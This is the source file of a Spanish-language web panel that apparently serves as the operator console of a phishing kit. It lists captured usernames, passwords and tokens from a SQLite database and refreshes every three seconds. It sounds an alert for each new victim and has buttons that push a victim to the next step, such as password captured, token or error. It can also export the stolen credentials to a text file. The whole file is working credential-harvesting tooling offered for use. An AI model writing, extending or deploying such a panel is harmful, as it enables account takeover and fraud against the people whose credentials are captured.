<?php
session_start();

// Función para obtener la IP real del cliente
function getUserIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip = trim(getUserIP()); // IP del usuario
$autorizadosFile = 'autorizados.json';

// Leer IPs autorizadas
$autorizados = file_exists($autorizadosFile) ? json_decode(file_get_contents($autorizadosFile), true) : [];

if (!is_array($autorizados)) {
    $autorizados = [];
}

// Normalizar IPs autorizadas
$autorizados = array_map('trim', $autorizados);

// Verificar si está autorizada
if (!in_array($ip, $autorizados)) {
    header("Location: login.php");
    exit;
}

// Eliminar todos los datos
if (isset($_POST['eliminar_todo'])) {
    try {
        $db = new PDO('sqlite:usuarios.db');
        $db->exec("DELETE FROM usuarios");
    } catch (Exception $e) {}
    header("Location: panel.php");
    exit;
}

// Guardar todo en TXT
if (isset($_POST['guardar_txt'])) {
    try {
        $db = new PDO('sqlite:usuarios.db');
        $usuarios = $db->query("SELECT * FROM usuarios")->fetchAll(PDO::FETCH_ASSOC);

        $txt = "";
        foreach ($usuarios as $u) {
            $txt .= "Usuario: {$u['usuario']}\n";
            $txt .= "Clave: {$u['clave']}\n";
            $txt .= "Estado: {$u['estado']}\n";
            if (!empty($u['token'])) $txt .= "Token: {$u['token']}\n";
            $txt .= "Ident: {$u['identificador']}\n";
            $txt .= "----------------------\n";
        }

        file_put_contents("reporte.txt", $txt);
    } catch (Exception $e) {}
    header("Location: panel.php");
    exit;
}

// Petición AJAX
if (isset($_GET['ajax'])) {
    try {
        $db = new PDO('sqlite:usuarios.db');
        $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $usuarios = $db->query("SELECT * FROM usuarios ORDER BY fecha DESC")->fetchAll(PDO::FETCH_ASSOC);
        header('Content-Type: application/json');
        echo json_encode($usuarios);
    } catch (Exception $e) {
        echo json_encode([]);
    }
    exit;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Panel</title>
    <style>
        body {
            background: #000;
            color: white;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 10px;
        }

        h2 {
            text-align: center;
            color: #0ff;
            font-size: 20px;
            margin-bottom: 15px;
        }

        .fila-tablas {
            display: flex;
            gap: 20px;
            overflow-x: auto;
            padding: 10px;
        }

        .columna {
            display: flex;
            flex-direction: column;
            gap: 10px;
            min-width: 270px;
        }

        .tarjeta {
            background: #111;
            padding: 10px;
            border-radius: 10px;
            box-shadow: 0 0 6px #333;
            width: 250px;
            font-size: 13px;
            border: 2px solid #333;
            transition: all 0.3s ease-in-out;
            display: flex;
            justify-content: space-between;
            gap: 8px;
        }

        .tarjeta.verde {
            border-color: #28a745;
            animation: palpitarVerde 1.4s infinite;
        }

        .tarjeta.rojo {
            border-color: #dc3545;
        }

        @keyframes palpitarVerde {
            0%, 100% { box-shadow: 0 0 10px #28a745; }
            50% { box-shadow: 0 0 30px #28a745; }
        }

        .contenido {
            flex-grow: 1;
        }

        .dato {
            margin-bottom: 5px;
            cursor: pointer;
            line-height: 1.4;
        }

        .dato strong {
            color: #ccc;
            display: inline-block;
            width: 75px;
        }

        .dato span {
            color: #0ff;
        }

        .usuario span, .clave span, .token span {
            color: #f5da42;
        }

        .acciones {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .acciones button {
            padding: 3px 6px;
            font-size: 11px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            color: white;
            white-space: nowrap;
        }

        .usuario-btn { background: #007bff; }
        .clave-btn   { background: #6f42c1; color: white; }
        .token-btn   { background: #17a2b8; }
        .error-btn   { background: #e83e8c; }

        .botones {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-bottom: 20px;
        }

        .botones button {
            padding: 8px 15px;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
        }

        .eliminar { background: #dc3545; color: white; }
        .guardar { background: #17a2b8; color: white; }
    </style>
</head>
<body>

<form method="POST" class="botones">
    <button type="submit" name="eliminar_todo" class="eliminar" onclick="return confirm('¿Seguro que quieres eliminar todos los datos?')">🗑 Eliminar todo</button>
    <button type="submit" name="guardar_txt" class="guardar">💾 Guardar en TXT</button>
</form>

<h2>Panel de Administración</h2>

<div class="fila-tablas" id="contenedor"></div>

<audio id="sonidoNuevo">
    <source src="nuevo.mp3" type="audio/mpeg">
</audio>

<script>
    let datosAnteriores = [];
    let primeraCarga = true;

    function copiar(texto) {
        if (texto && texto !== 'N/A') {
            navigator.clipboard.writeText(texto);
        }
    }

    function crearBoton(id, estado, texto, clase) {
        const button = document.createElement("button");
        button.type = "button";
        button.className = clase;
        button.textContent = texto;

        button.addEventListener("click", () => {
            const formData = new FormData();
            formData.append("id", id);
            formData.append("estado", estado);

            fetch("updateAction.php", {
                method: "POST",
                body: formData
            })
            .then(() => {
                cargarUsuarios();
            })
            .catch(err => console.error("Error al actualizar:", err));
        });

        return button;
    }

    function crearTarjeta(usuario) {
        const tarjeta = document.createElement("div");
        tarjeta.id = `tarjeta-${usuario.id}`;
        tarjeta.classList.add("tarjeta");
        tarjeta.classList.add(usuario.estado === "esperando" ? "verde" : "rojo");

        const contenido = document.createElement("div");
        contenido.classList.add("contenido");
        
        contenido.innerHTML = `
            <div class="dato usuario" onclick="copiar('${usuario.usuario || ''}')">
                <strong>Usuario:</strong> <span>${usuario.usuario || 'N/A'}</span>
            </div>
            <div class="dato clave" onclick="copiar('${usuario.clave || ''}')">
                <strong>Clave:</strong> <span>${usuario.clave || 'N/A'}</span>
            </div>
            <div class="dato"><strong>Estado:</strong> <span>${usuario.estado}</span></div>
            ${usuario.token ? `<div class="dato token" onclick="copiar('${usuario.token}')"><strong>Token:</strong> <span>${usuario.token}</span></div>` : ''}
            <div class="dato"><strong>Ident:</strong> <span>${usuario.identificador}</span></div>
        `;

        const acciones = document.createElement("div");
        acciones.className = "acciones";
        
        // ✅ BOTONES CON FUNCIONES CORRECTAS
        acciones.appendChild(crearBoton(usuario.id, "esperando", "✏ USUARIO", "usuario-btn"));
        acciones.appendChild(crearBoton(usuario.id, "clave_capturada", "🔐 CLAVE", "clave-btn"));
        acciones.appendChild(crearBoton(usuario.id, "token", "🔑 TOKEN", "token-btn"));
        acciones.appendChild(crearBoton(usuario.id, "error", "❌ ERROR", "error-btn"));

        tarjeta.appendChild(contenido);
        tarjeta.appendChild(acciones);
        
        return tarjeta;
    }

    function cargarUsuarios() {
        fetch("panel.php?ajax=1")
            .then(res => res.json())
            .then(data => {
                const contenedor = document.getElementById("contenedor");
                const sonido = document.getElementById("sonidoNuevo");

                // Verificar si hay nuevos usuarios
                const idsActuales = data.map(u => u.id);
                const idsPrevios = datosAnteriores.map(u => u.id);
                const nuevos = idsActuales.filter(id => !idsPrevios.includes(id));
                
                if (nuevos.length > 0 && !primeraCarga) {
                    sonido.play();
                }

                // LIMPIAR TODO y reconstruir desde cero
                contenedor.innerHTML = '';

                // Organizar en columnas (máximo 5 por columna)
                const columnas = [];
                for (let i = 0; i < data.length; i += 5) {
                    columnas.push(data.slice(i, i + 5));
                }

                // Crear columnas y tarjetas
                columnas.forEach((grupo, colIndex) => {
                    const col = document.createElement("div");
                    col.className = "columna";
                    
                    grupo.forEach(usuario => {
                        const tarjeta = crearTarjeta(usuario);
                        col.appendChild(tarjeta);
                    });
                    
                    contenedor.appendChild(col);
                });

                datosAnteriores = data;
                primeraCarga = false;
            })
            .catch(err => console.error(err));
    }

    // Cargar inicialmente
    cargarUsuarios();
    
    // Actualizar cada 3 segundos
    setInterval(cargarUsuarios, 3000);
</script>

</body>
</html>